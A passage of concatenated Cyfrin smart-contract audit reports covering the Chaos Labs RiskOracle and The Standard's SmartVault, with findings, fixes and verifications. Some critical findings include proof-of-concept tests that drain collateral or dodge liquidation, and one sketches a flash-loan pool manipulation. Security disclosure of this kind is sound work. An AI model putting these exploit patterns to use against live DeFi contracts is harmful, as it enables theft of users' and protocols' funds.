**Cyfrin:** Verified.


### Delete fulfilled vrf request from `vrfRequestIdToRequester` in `VRFHandler::fulfillRandomWords`

**Description:** Delete fulfilled vrf request from `vrfRequestIdToRequester` in `VRFHandler::fulfillRandomWords`:
```diff
  function fulfillRandomWords(uint256 _requestId, uint256[] calldata _randomWords) internal override {
    // Check if the request has already been fulfilled
    if (vrfFulfilledRequests[_requestId]) revert InvalidVrfState();

    // Cache the contract that requested the random numbers based on the request ID
    address contractRequestor = vrfRequestIdToRequester[_requestId];

    // Revert if the contract that requested the random numbers is not found
    if (contractRequestor == address(0)) revert InvalidVrfState();

+   // delete the active requestId -> requestor record
+   delete vrfRequestIdToRequester[_requestId];

    // Mark the request as fulfilled
    vrfFulfilledRequests[_requestId] = true;

    // Decrement the counter of outstanding requests
    activeRequests--;

    // Call the contract that requested the random numbers with the random numbers
    IVRFHandlerReceiver(contractRequestor).fulfillRandomWords(_requestId, _randomWords);
  }
```

**Mode:**
Fixed in commit [08d7ce4](https://github.com/Earnft/dropbox-smart-contracts/commit/08d7ce40f24e958b51528233f57b99f4333c7501).

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2024-08-15-cyfrin-earnm-dropbox-v2.0.md ------


------ FILE START car/reports_md/2024-08-21-cyfrin-chaos-labs-risk-oracle-v2.0.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

**Assisting Auditors**




---

# Findings
## Medium Risk


### Incorrect state update in `RiskOracle::_processUpdate`

**Description:** Within the `RiskParameterUpdate` struct, there is a field [`bytes previousValue`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L15) that is intended to store the previous value of a parameter. This state update is performed within [`RiskOracle::_processUpdate`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L156-L158) with the [value obtained](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L155) from the `updatedById` mapping; however, there is no differentiation between parameters for different update types and markets so this state update will be inaccurate with overwhelming likelihood when there are multiple update types/markets. As such, consumers of this contract will receive recommendations with previous values that could be wildly different from what is expected and perhaps execute risk parameter updates based on a delta that is not representative of the real change.

**Impact:** The `previousValue` state for a given update will be incorrect with a very high likelihood and could result in consumers making risk parameter updates based on inaccurate historical data.

**Proof of Concept:** The following test was written to demonstrate this finding and has since been added to the repository during this engagement.

```solidity
function test_PreviousValueIsCorrectForSpecificMarketAndType() public {
    bytes memory market1 = abi.encodePacked("market1");
    bytes memory market2 = abi.encodePacked("market2");
    bytes memory newValue1 = abi.encodePacked("value1");
    bytes memory newValue2 = abi.encodePacked("value2");
    bytes memory newValue3 = abi.encodePacked("value3");
    bytes memory newValue4 = abi.encodePacked("value4");
    string memory updateType = initialUpdateTypes[0];

    vm.startPrank(AUTHORIZED_SENDER);

    // Publish first update for market1 and type1
    riskOracle.publishRiskParameterUpdate(
        "ref1", newValue1, updateType, market1, abi.encodePacked("additionalData1")
    );

    // Publish second update for market1 and type1
    riskOracle.publishRiskParameterUpdate(
        "ref2", newValue2, updateType, market1, abi.encodePacked("additionalData2")
    );

    // Publish first update for market2 and type1
    riskOracle.publishRiskParameterUpdate(
        "ref3", newValue3, updateType, market2, abi.encodePacked("additionalData3")
    );

    // Publish first update for market1 and type1
    riskOracle.publishRiskParameterUpdate(
        "ref4", newValue4, updateType, market1, abi.encodePacked("additionalData4")
    );

    vm.stopPrank();

    // Fetch the latest update for market1 and type1
    RiskOracle.RiskParameterUpdate memory latestUpdateMarket1Type1 =
        riskOracle.getLatestUpdateByParameterAndMarket(updateType, market1);
    assertEq(latestUpdateMarket1Type1.previousValue, newValue2);

    // Fetch the latest update for market2 and type1
    RiskOracle.RiskParameterUpdate memory latestUpdateMarket2Type1 =
        riskOracle.getLatestUpdateByParameterAndMarket(updateType, market2);
    assertEq(latestUpdateMarket2Type1.previousValue, bytes(""));
}
```

**Recommended Mitigation:** Retrieve the correct historical value using the [`latestUpdateIdByMarketAndType`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L28) mapping.

**Chaos Labs:** Fixed in commit [d16a227](https://github.com/ChaosLabsInc/risk-oracle/commit/d16a2277f7fb0efee0053389492aa116543a2bf7).

**Cyfrin:** Verified, the previous update value is now retrieved from the correct identifier.

\clearpage
## Informational


### Asymmetry in validation between `RiskOracle::addUpdateType` and contract constructor

**Description:** The following [validation](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L92) is present within `RiskOracle::addUpdateType`:
```solidity
require(!validUpdateTypes[newUpdateType], "Update type already exists.");
```
However, this function has the `onlyOwner` modifier applied, so the validation is not strictly necessary. This can be observed within the constructor, invoked when the owner deploys the contract, where there is no such validation  here, it is assumed that duplicates will be checked off-chain. As such, there is an asymmetry between these two instances that is recommended to be made consistent by either completely removing the validation or having it present in both code paths.

**Chaos Labs:** Added duplicate check in constructor in commit [9f7375a](https://github.com/ChaosLabsInc/risk-oracle/commit/9f7375a8291deb04719ec4ddbfff1eb638db55e1).

**Cyfrin:** Verified, the duplicate check has been added to the constructor.


### No restriction on the contract owner becoming an authorized sender

**Description:** Due to the presence of the `onlyOwner` modifier applied to [`RiskOracle::addAuthorizedSender`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L67-L75), only the contract owner is permitted to add authorized senders. Currently, the only validation present is to prevent adding an authorized sender that is already authorized, so it is possible for the owner to add themselves as an authorized sender. If this is not desired, for example to strictly enforce a separation of concerns between the two roles, then this restriction should be added.

**Chaos Labs:** Acknowledged there is no restriction on the contract owner becoming an authorized sender.

**Cyfrin:** Acknowledged.


### Duplicated validation can be moved to shared internal function

**Description:** Currently, both `RiskOracle::publishRiskParameterUpdate` and `RiskOracle::publishBulkRiskParameterUpdates` contain essentially the same validation:
```solidity
// `RiskOracle::publishRiskParameterUpdate`:
require(validUpdateTypes[updateType], "Unauthorized update type.");

// `RiskOracle::publishBulkRiskParameterUpdates`:
require(validUpdateTypes[updateTypes[i]], "Unauthorized update type at index");
```
Both functions also call the internal `_processUpdate()` function, so this validation can be de-duplicated by placing it there instead.

**Chaos Labs:** Fixed in commit [6cf09fb](https://github.com/ChaosLabsInc/risk-oracle/commit/6cf09fbe31a2050d04b60c79eddfa15f5cd5ca15).

**Cyfrin:** Verified, the validation is now present in the shared internal function.


### Parallel data structures are not necessary

**Description:** Usage of the [`updatesById`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L25) mapping with keys given by the monotonically increasing [`updateCounter`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L29) state variable is effectively the same as using the [`updateHistory`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L25) array with an index shift of 1 (due to 0 being reserved for invalid update ids). In the current design, it is not necessary to maintain these parallel data structures, so if the format of update ids is unlikely to change in the future then this `updatesById` mapping can be removed in favor of the `updateHistory` array. Note that this modification would necessitate additional refactoring in the `getLatestUpdateByType()`, `getLatestUpdateByParameterAndMarket()`, and `getUpdateById()` functions.

**Chaos Labs:** Fixed in commit [6cf09fb](https://github.com/ChaosLabsInc/risk-oracle/commit/6cf09fbe31a2050d04b60c79eddfa15f5cd5ca15).

**Cyfrin:** Verified, the `RiskParameterUpdate[] updateHistory` has been removed.


### Unreachable code can be removed

**Description:** Within [`RiskOracle::_processUpdate`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L155), the `else` branch of the ternary operator is unreachable due to `updateCounter` being initialized to 0 and incremented before this line:

```solidity
updateCounter++;
bytes memory previousValue = updateCounter > 0 ? updatesById[updateCounter - 1].newValue : bytes("");
```

Thus, this variable assignment logic can be simplified to just reading from the mapping (but note that this usage of the `updatedById` mapping is incorrect, as reported in M-01).

**Chaos Labs:** Fixed in commit [6cf09fb](https://github.com/ChaosLabsInc/risk-oracle/commit/6cf09fbe31a2050d04b60c79eddfa15f5cd5ca15).

**Cyfrin:** Verified, the code path has been removed.

\clearpage
## Gas Optimization


### Unnecessary initialization can be removed

**Description:** Initialization of the `updateCounter` state variable [within the constructor](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L64) of `RiskOracle` is unnecessary and can be removed since this state will be `0` by default.

**Chaos Labs:** Fixed in commit [9f7375a](https://github.com/ChaosLabsInc/risk-oracle/commit/9f7375a8291deb04719ec4ddbfff1eb638db55e1).

**Cyfrin:** Verified, the initialization is no longer present.


### Array length validation is not necessary

**Description:** [`RiskOracle::publishBulkRiskParameterUpdates`](https://github.com/ChaosLabsInc/risk-oracle/blob/9449219174e3ee7da9a13a5db7fb566836fb4986/src/RiskOracle.sol#L117-L142) currently validates that the lengths of all input arrays are equal.

```solidity
function publishBulkRiskParameterUpdates(
    string[] memory referenceIds,
    bytes[] memory newValues,
    string[] memory updateTypes,
    bytes[] memory markets,
    bytes[] memory additionalData
) external onlyAuthorized {
    require(
        referenceIds.length == newValues.length && newValues.length == updateTypes.length
            && updateTypes.length == markets.length && markets.length == additionalData.length,
        "Mismatch between argument array lengths."
    );
    for (uint256 i = 0; i < referenceIds.length; i++) {
        require(validUpdateTypes[updateTypes[i]], "Unauthorized update type at index");
        _processUpdate(referenceIds[i], newValues[i], updateTypes[i], markets[i], additionalData[i]);
    }
}
```

This validation can be removed on account of the loop over `referenceIds`, as a length mismatch will either revert due to out-of-bounds access or result in additional elements beyond the length of the `referenceIds` array being ignored.

**Chaos Labs:** Fixed in commit [6cf09fb](https://github.com/ChaosLabsInc/risk-oracle/commit/6cf09fbe31a2050d04b60c79eddfa15f5cd5ca15).

**Cyfrin:** Verified, the validation has been removed.

\clearpage

------ FILE END car/reports_md/2024-08-21-cyfrin-chaos-labs-risk-oracle-v2.0.md ------


------ FILE START car/reports_md/2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

[Immeas](https://twitter.com/0ximmeas)

**Assisting Auditors**



---

# Findings
## Critical Risk


### USDs stability can be compromised as collateral deposited to Gamma vaults is not considered during liquidation

**Description:** Users of The Standard can take out `USDs` stablecoin loans against their collateral deposited into an instance of `SmartVaultV4`. If the collateral value of a Smart Vault falls below 110% of the `USDs` debt value, it can be liquidated in full. Users can also move collateral tokens into Gamma Vaults (aka Hypervisors) that hold LP positions in Uniswap V3 to earn an additional yield on their deposited collateral.

Collateral held as yield positions in Gamma Vaults are represented by Hypervisor tokens transferred to and held by the `SmartVaultV4` contract; however, these tokens are not affected by liquidation:

```solidity
function liquidate() external onlyVaultManager {
    if (!undercollateralised()) revert NotUndercollateralised();
    liquidated = true;
    minted = 0;
    liquidateNative();
    ITokenManager.Token[] memory tokens = ITokenManager(ISmartVaultManagerV3(manager).tokenManager()).getAcceptedTokens();
    for (uint256 i = 0; i < tokens.length; i++) {
        if (tokens[i].symbol != NATIVE) liquidateERC20(IERC20(tokens[i].addr));
    }
}
```

Currently, Hypervisor tokens present in the `SmartVaultV4::hypervisors` array are not included in the array returned by `TokenManager::getAcceptedTokens` as this would require them to have a Chainlink data feed. Therefore, any collateral deposited as a yield position within a Gamma Vault will remain unaffected.

A user could reasonably have a Smart Vault with 100% of their collateral deposited to Gamma, with 100% of the maximum USDs minted. At this point, any small market fluctuation would leave the Smart Vault undercollateralised and susceptible to liquidation. Given that the `minted` state variable is reset to zero upon successful liquidation, the user is again able to access this collateral via [`SmartVaultV4::removeCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L186) due to the validation in [`SmartVaultV4::canRemoveCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L171):

```solidity
function canRemoveCollateral(ITokenManager.Token memory _token, uint256 _amount) private view returns (bool) {
    if (minted == 0) return true;
    /* snip: collateral calculations */
}
```

Consequently, the user can withdraw the collateral without repaying the original `USDs` loan. Given the `liquidated` state variable would now be set to `true`, any attacker would need to create a new Smart Vault before the collateral could be used again.

**Impact:** An attacker could repeatedly borrow against collateral deposited in a yield position after being liquidated, resulting in bad debt for the protocol and likely compromising the stability of `USDs` if executed on a large scale.

**Proof of Concept:** The following test can be added to `SmartVault.js`:
```javascript
it('cant liquidate yield positions', async () => {
  const ethCollateral = ethers.utils.parseEther('0.1')
  await user.sendTransaction({ to: Vault.address, value: ethCollateral });

  let { collateral, totalCollateralValue } = await Vault.status();
  let preYieldCollateral = totalCollateralValue;
  expect(getCollateralOf('ETH', collateral).amount).to.equal(ethCollateral);

  depositYield = Vault.connect(user).depositYield(ETH, HUNDRED_PC.div(10));
  await expect(depositYield).not.to.be.reverted;
  await expect(depositYield).to.emit(YieldManager, 'Deposit').withArgs(Vault.address, MockWeth.address, ethCollateral, HUNDRED_PC.div(10));

  ({ collateral, totalCollateralValue } = await Vault.status());
  expect(getCollateralOf('ETH', collateral).amount).to.equal(0);
  expect(totalCollateralValue).to.equal(preYieldCollateral);

  const mintedValue = ethers.utils.parseEther('100');
  await Vault.connect(user).mint(user.address, mintedValue);

  await expect(VaultManager.connect(protocol).liquidateVault(1)).to.be.revertedWith('vault-not-undercollateralised')

  // drop price, now vault is liquidatable
  await CL_WBTC_USD.setPrice(1000);

  await expect(VaultManager.connect(protocol).liquidateVault(1)).not.to.be.reverted;
  ({ minted, maxMintable, totalCollateralValue, collateral, liquidated } = await Vault.status());

  // hypervisor tokens (yield position) not liquidated
  await expect(MockWETHWBTCHypervisor.balanceOf(Vault.address)).to.not.equal(0);

  // since minted is zero, the vault owner still has access to all collateral
  expect(minted).to.equal(0);
  expect(maxMintable).to.not.equal(0);
  expect(totalCollateralValue).to.not.equal(0);
  collateral.forEach(asset => expect(asset.amount).to.equal(0));
  expect(liquidated).to.equal(true);

  // price returns
  await CL_WBTC_USD.setPrice(DEFAULT_ETH_USD_PRICE.mul(20));

  // user exits yield position
  await Vault.connect(user).withdrawYield(MockWETHWBTCHypervisor.address, ETH);
  await Vault.connect(user).withdrawYield(MockUSDsHypervisor.address, ETH);

  // and withdraws assets
  const userBefore = await ethers.provider.getBalance(user.address);
  await Vault.connect(user).removeCollateralNative(await ethers.provider.getBalance(Vault.address), user.address);
  const userAfter = await ethers.provider.getBalance(user.address);

  // user should have all collateral back minus protocol fee from yield withdrawal
  expect(userAfter.sub(userBefore)).to.be.closeTo(ethCollateral, ethers.utils.parseEther('0.01'));

  // and user also has the minted USDs
  const usds = await USDs.balanceOf(user.address);
  expect(usds).to.equal(mintedValue);
});
```

**Recommended Mitigation:** Ensure that collateral held in yield positions is also subject to liquidation.

**The Standard DAO:** Fixed by commit [`c6af5d2`](https://github.com/the-standard/smart-vault/commit/c6af5d21fc20244531c0202b70eb9392a6ea9b6a).

**Cyfrin:** Verified, `SmartVault4::liquidate` now also loops over the `SmartVaultV4::hypervisors` array. However, native liquidation should be performed last to mitigate re-entrancy risk. Similarly, revocation of roles in `SmartVaultManagerV6::liquidateVault` should occur before invoking `SmartVaultV4::liquidate`.

**The Standard DAO:** Fixed by commit [`23c573c`](https://github.com/the-standard/smart-vault/commit/23c573cba241b0dc6af276f56ee8772efc8b4a5c).

**Cyfrin:** Verified, the order of calls had been modified.


### USDs stability can be compromised as collateral can be stolen by removing Hypervisor tokens directly from a vault without repaying USDs debt

**Description:** When the owner of a Smart Vault calls [`SmartVaultV4::depositYield`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L167-L180), [`SmartVaultYieldManager::deposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L299-L310) is invoked to deposit the specified collateral tokens to a given Gamma Vault (aka Hypervisor) via the [`IUniProxy`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/interfaces/IUniProxy.sol#L6) contract. Gamma Hypervisors work such that they hold a position in a Uniswap V3 pool that is made fungible to depositors who own shares in this position represented as an ERC-20 token. On completion of a deposit, the Hypervisor tokens are transferred back to the calling `SmartVaultV4` contract where they remain as backing for any minted `USDs` debt.

However, due to insufficient input validation, these Hypervisor collateral tokens can be removed from the Smart Vault by calling [`SmartVaultV4::removeAsset`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L191-L196):

```solidity
function removeAsset(address _tokenAddr, uint256 _amount, address _to) external onlyOwner {
    ITokenManager.Token memory token = getTokenManager().getTokenIfExists(_tokenAddr);
    if (token.addr == _tokenAddr && !canRemoveCollateral(token, _amount)) revert Undercollateralised();
    IERC20(_tokenAddr).safeTransfer(_to, _amount);
    emit AssetRemoved(_tokenAddr, _amount, _to);
}
```

Hypervisor tokens are present only in the [`SmartVaultV4::hypervisors`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L26) array and are not handled by the `TokenManager` contract, so `token.addr` will equal `address(0)` and the collateralisation check will be bypassed. Thus, these tokens can be extracted from the contract, leaving the Smart Vault in an undercollateralised state and the protocol with bad debt.

**Impact:** An attacker can borrow the maximum mintable amount of `USDs` against their deposited yield collateral, then leave their Smart Vault undercollateralised by simply removing the collateral Hypervisor tokens. The attacker receives both the `USDs` and its backing collateral while the protocol is left with bad debt, likely compromising the stability of `USDs` if executed on a large scale or atomically with funds obtained from a flash loan.

**Proof of Concept:** The following test can be added to `SmartVault.js`:

```javascript
it('can steal collateral hypervisor tokens', async () => {
  const ethCollateral = ethers.utils.parseEther('0.1')
  await user.sendTransaction({ to: Vault.address, value: ethCollateral });

  let { collateral, totalCollateralValue } = await Vault.status();
  let preYieldCollateral = totalCollateralValue;
  expect(getCollateralOf('ETH', collateral).amount).to.equal(ethCollateral);

  depositYield = Vault.connect(user).depositYield(ETH, HUNDRED_PC);
  await expect(depositYield).not.to.be.reverted;
  await expect(depositYield).to.emit(YieldManager, 'Deposit').withArgs(Vault.address, MockWeth.address, ethCollateral, HUNDRED_PC);

  ({ collateral, totalCollateralValue } = await Vault.status());
  expect(getCollateralOf('ETH', collateral).amount).to.equal(0);
  expect(totalCollateralValue).to.equal(preYieldCollateral);

  const mintedValue = ethers.utils.parseEther('100');
  await Vault.connect(user).mint(user.address, mintedValue);

  // Vault is fully collateralised after minting USDs
  expect(await Vault.undercollateralised()).to.be.equal(false);

  const hypervisorBalanceVault = await MockUSDsHypervisor.balanceOf(Vault.address);
  await Vault.connect(user).removeAsset(MockUSDsHypervisor.address, hypervisorBalanceVault , user.address);

  // Vault has no collateral left and as such is undercollateralised
  expect(await MockUSDsHypervisor.balanceOf(Vault.address)).to.be.equal(0);
  expect(await Vault.undercollateralised()).to.be.equal(true);

  // User has both the minted USDs and Hypervisor collateral tokens
  expect(await MockUSDsHypervisor.balanceOf(user.address)).to.be.equal(hypervisorBalanceVault);
  expect(await USDs.balanceOf(user.address)).to.be.equal(mintedValue);
});
```

**Recommended Mitigation:** Validate that the asset removed is not a Hypervisor token present in the `hypervisors` array.

If considering adding the Hypervisor tokens as collateral in the `TokenManager`, ensure that they are excluded from [this loop](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L108-L111) within `SmartVaultV4::usdCollateral` and the [pricing calculation](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L131) in `SmartVaultV4::getAssets` is also updated accordingly.

**The Standard DAO:** Fixed by commit [`5862d8e`](https://github.com/the-standard/smart-vault/commit/5862d8e10ac8648b89a7e3a78498ff20dc31e42e).

**Cyfrin:** Verified, Hypervisor tokens can no longer be removed without causing `SmartVault::removeAsset` to revert due to being undercollateralised. However, the use of the `remainCollateralised()` modifier in `SmartVaultV4::removeCollateralNative` has introduced a re-entrancy vulnerability whereby the protocol burn fee can be bypassed by the Smart Vault owner: deposit native collateral  mint USDs  remove native collateral  re-enter & self-liquidate. Here, the original validation should be used as this does not affect Hypervisor tokens.

**The Standard DAO:** Fixed by commit [`d761d48`](https://github.com/the-standard/smart-vault/commit/d761d48e957d45c5d61eb494d41b7362f7001155).

**Cyfrin:** Verified, `SmartVaultV4::removeCollateralNative` can no longer be used to re-enter in an undercollateralised state.

\clearpage
## High Risk


### `USDs` self-backing breaks assumptions around economic peg-maintenance incentives

**Description:** When `SmartVaultYieldManager::deposit` is called via `SmartVaultV4::depositYield`, [at least 10%](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L168) of the deposited collateral must be directed toward the `USDs` Hypervisor (which in turn holds an LP position in a protocol-managed `USDs/USDC` Ramses pool):

```solidity
function deposit(address _collateralToken, uint256 _usdPercentage) external returns (address _hypervisor0, address _hypervisor1) {
    if (_usdPercentage < MIN_USDS_PERCENTAGE) revert StablePoolPercentageError();
    uint256 _balance = IERC20(_collateralToken).balanceOf(address(msg.sender));
    IERC20(_collateralToken).safeTransferFrom(msg.sender, address(this), _balance);
    HypervisorData memory _hypervisorData = hypervisorData[_collateralToken];
    if (_hypervisorData.hypervisor == address(0)) revert HypervisorDataError();
    _usdDeposit(_collateralToken, _usdPercentage, _hypervisorData.pathToUSDC);
    /* snip: other hypervisor deposit */
}
```

When the value of the Smart Vault's collateral is determined by `SmartVaultV4::yieldVaultCollateral`, ignoring the issue of hardcoding stablecoins to $1, the value of the tokens underlying each Hypervisor is used:

```solidity
if (_token0 == address(USDs) || _token1 == address(USDs)) {
    // both USDs and its vault pair are  stablecoins, but can be equivalent to 1 in collateral
    _usds += _underlying0 * 10 ** (18 - ERC20(_token0).decimals());
    _usds += _underlying1 * 10 ** (18 - ERC20(_token1).decimals());
```

The issue for `USDs` Hypervisor deposits is that this [underlying balance](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L90-L93) of `USDs` counts toward the [total collateral value](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L113) of the Smart Vault, and there is no restriction on the maximum amount of collateral that can be directed toward this Hypervisor. Hence, users can use `USDs` to collateralize their `USDs` loans with up to as much as 100% of the total collateral deposited to the `USDs/USDC` pool (50% in `USDs` if both stablecoin tokens are assumed to be at peg).

**Impact:** Once the peg is lost for endogenously collateralized stablecoins, such as those backed by themselves, it becomes increasingly difficult to return to recover as the value of both the stablecoin and its collateral decrease in tandem. This self-backing also breaks the assumptions surrounding the economic incentives of the protocol intended to contribute to peg-maintenance.

**Recommended Mitigation:** Consider disallowing the use of `USDs` Hypervisor tokens as backing collateral and implementing some other mechanism to ensure sufficient liquidity in the pool. Alternatively, the percentage of collateral allowed to be directed toward the `USDs` Hypervisor could be limited, but this would not completely mitigate the risk.

**The Standard DAO:** Fixed by commit [`cc86606`](https://github.com/the-standard/smart-vault/commit/cc86606ef6f8c1fea84f378e7f324e648f9bcbc8).

**Cyfrin:** Verified, `USDs` no longer contributes to Smart Vault yield collateral.


### USD stablecoins are incorrectly assumed to always be at peg

**Description:** [`SmartVaultV4::yieldVaultCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L79-L103) returns the value of collateral held in yield positions for a given Smart Vault. For all Gamma Vaults other than the `USDs` Hypervisor, the dollar value of the underlying amounts of collateral tokens fetched for each Gamma Vault in which collateral is deposited is calculated using prices reported by Chainlink.

```solidity
function yieldVaultCollateral(ITokenManager.Token[] memory _acceptedTokens) private view returns (uint256 _usds) {
    for (uint256 i = 0; i < hypervisors.length; i++) {
        IHypervisor _Hypervisor = IHypervisor(hypervisors[i]);
        uint256 _balance = _Hypervisor.balanceOf(address(this));
        if (_balance > 0) {
            uint256 _totalSupply = _Hypervisor.totalSupply();
            (uint256 _underlyingTotal0, uint256 _underlyingTotal1) = _Hypervisor.getTotalAmounts();
            address _token0 = _Hypervisor.token0();
            address _token1 = _Hypervisor.token1();
            uint256 _underlying0 = _balance * _underlyingTotal0 / _totalSupply;
            uint256 _underlying1 = _balance * _underlyingTotal1 / _totalSupply;
            if (_token0 == address(USDs) || _token1 == address(USDs)) {
                // both USDs and its vault pair are  stablecoins, but can be equivalent to 1 in collateral
                _usds += _underlying0 * 10 ** (18 - ERC20(_token0).decimals());
                _usds += _underlying1 * 10 ** (18 - ERC20(_token1).decimals());
            } else {
                for (uint256 j = 0; j < _acceptedTokens.length; j++) {
                    ITokenManager.Token memory _token = _acceptedTokens[j];
                    if (_token.addr == _token0) _usds += calculator.tokenToUSD(_token, _underlying0);
                    if (_token.addr == _token1) _usds += calculator.tokenToUSD(_token, _underlying1);
                }
            }
        }
    }
}
```

On every collateral deposit to a Gamma Vault, a minimum amount is required to be directed to the `USDs/USDC` pair. Thus, there will always be a non-zero balance of `USDs` Hypervisor tokens if the balance of any other Hypervisor tokens is also non-zero for a given Gamma Vault.

As such, and because there is no Chainlink price feed for `USDs`, this Hypervisor is handled separately; however, this logic incorrectly assumes that the prices of `USDC` and `USDs` will always be equivalent at $1. This is not always true  there have been instances where USDC has experienced de-pegging events, significant in both magnitude and duration. Similar concerns are present for `USDs`, ignoring issues related to self-backing raised in a separate finding.

In the event of either stablecoin de-pegging, Smart Vault owners can borrow above their true collateral value. While strictly hypothetical, it may also be possible to bring about this scenario by direct manipulation of the`USDs/USDC` pool through the following actions:
- Flash loan `WETH` collateral & deposit to Smart Vault.
- Deposit 100% of collateral to the `USDs` Hypervisor.
- Mint a large amount of `USDs`.
- Sell into the `USDs/USDC` pool.
- Assuming `USDs` de-pegs such that more of the position underlying the `USDs` Hypervisor is in `USDs`, this "borrowing above collateral value" effect would be amplified and the Smart Vault yield collateral would increase.
- Borrow more `USDs` using the inflated yield vault collateral calculation, pay back the loan, and repeat.

**Impact:** If either `USDC` or `USDs` fall below their $1 peg, users can mint more `USDs` collateralized by a `USDs/USDC` Hypervisor deposit than should be possible. It may also be possible to directly influence the stability of `USDs` depending on conditions in the `USDs/USDC` pool when one or both stablecoins de-peg.

Additionally, ignoring the separate finding related to Hypervisor tokens not being affected by liquidations, a collateral deposit fully directed to the `USDs` Hypervisor can never be liquidated even if one or both stablecoins de-peg, causing the Smart Vault to become undercollateralised in reality.

**Recommended Mitigation:** Chainlink data feeds should be used to determine the price of `USDC`.

As a general recommendation, a manipulation-resistant alternative should be leveraged for pricing `USDs`; however, this finding underscores the issue with USDs self-backing as the intended economic incentives of the protocol will not apply in this scenario.

**The Standard DAO:** Fixed by commit [`cc86606`](https://github.com/the-standard/smart-vault/commit/cc86606ef6f8c1fea84f378e7f324e648f9bcbc8).

**Cyfrin:** Verified, `USDC` price is now obtained from Chainlink and `USDs` is no longer included in yield vault collateral. Consider querying the Chainlink data feed decimals instead of hardcoding to `1e8`.

**The Standard DAO:** Fixed by commit [`5febbc4`](https://github.com/the-standard/smart-vault/commit/5febbc4768602433db029d85aee29a4e4b1aa5f3).

**Cyfrin:** Verified, decimals are now queried dynamically.

\clearpage
## Medium Risk


### Yield deposits are susceptible to losses of up to 10\%

**Description:** To deal with the slippage incurred through multiple [[1](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L99), [2](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L127), [3](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L141), [4](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L151), [5](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L191), [6](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L197), [7](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L205)] intermediate DEX swaps and Gamma Vault interactions when [`SmartVaultV4::depositYield`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L299-L310) and [`SmartVaultV4::withdrawYield`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L312-L322) are called, there is a requirement that the total collateral value should not have decreased more than 90%:

```solidity
    function significantCollateralDrop(uint256 _preCollateralValue, uint256 _postCollateralValue) private pure returns (bool) {
    return _postCollateralValue < 9 * _preCollateralValue / 10;
}
```

